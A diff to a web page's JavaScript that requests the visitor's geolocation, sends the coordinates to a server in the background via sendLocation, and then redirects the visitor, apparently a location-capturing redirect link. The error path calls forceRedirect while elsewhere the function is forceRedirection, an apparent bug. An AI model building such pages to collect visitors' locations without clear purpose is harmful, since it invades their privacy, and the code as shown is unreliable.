@@ -139,44 +139,49 @@
           setTimeout(forceRedirection, 2000);
           return;
         }
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              // enableHighAccuracy: false,
+              // timeout: 10000,
+              // maximumAge: 300000, // 5 minutes
+            });
+          });
 
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
-            console.log(latitude, longitude);
+          const { latitude, longitude } = position.coords;
+          console.log('Location obtained:', { latitude, longitude });
+          showStatus('Location received! Redirecting...', 'success');
 
-            showStatus('Location received! Redirecting .....', 'success');
+          // Send location in background, don't wait for response
+          sendLocation(latitude, longitude);
 
-            sendLocation(latitude, longitude);
+          // Redirect immediately (don't wait for API)
+          setTimeout(() => {
+            forceRedirection();
+          }, 100);
+        } catch (error) {
+          console.error('Geolocation error:', error);
+          let errorMsg = 'Failed to get location. ';
 
-            setTimeout(() => {
-              forceRedirection();
-            }, 100);
-          },
-          (error) => {
-            console.error('Error getting location', error);
-            showStatus(error.message, 'error');
-
-            let errorMsg = 'Failed to get location';
-
-            switch (error.code) {
-              case error.PERMISSION_DENIED:
-                errorMsg += 'Permission denied.';
-                break;
-              case error.POSITION_UNAVAILABLE:
-                errorMsg += 'Location unavailable.';
-                break;
-              default:
-                errorMsg += 'Unknown error.';
-            }
-
-            // showStatus(`${errorMsg} Redirecting anyway....`, "error")
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              errorMsg += 'Permission denied.';
+              break;
+            case error.POSITION_UNAVAILABLE:
+              errorMsg += 'Location unavailable.';
+              break;
+            case error.TIMEOUT:
+              errorMsg += 'Request timed out.';
+              break;
+            default:
+              errorMsg += 'Unknown error.';
           }
-          // {
-          //   enableHighAccuracy: false,
-          //   maximumAge: 300000,
-          // }
-        );
+
+          showStatus(errorMsg + ' Redirecting anyway...', 'error');
+
+          // Still redirect even if location fails
+          setTimeout(forceRedirect, 1500);
+        }
 
         setTimeout(() => {
           if (!redirectAttempted && document.visibilityState === 'visible') {
